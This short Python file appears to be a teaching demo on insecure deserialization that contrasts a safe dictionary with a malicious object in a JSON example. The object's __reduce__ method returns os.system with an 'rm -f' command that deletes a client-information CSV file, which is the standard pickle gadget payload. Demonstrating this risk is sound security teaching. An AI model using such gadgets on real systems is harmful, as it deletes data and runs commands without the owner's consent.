import os
import json


def serialize_exploit(user_input):
    with open(
        "examples/insecure_deserialization/json_example/demo.json", "w"
    ) as write_file:
        json.dump(user_input, write_file)


# Safe input
user_input = {"test": "some safe input"}
serialize_exploit(user_input)


# Not-safe input
class DeleteClientInfo:
    def __reduce__(self):
        command = "rm -f examples/insecure_deserialization/json_example/important_client_information.csv"
        return (os.system, (command,))


serialize_exploit(DeleteClientInfo())
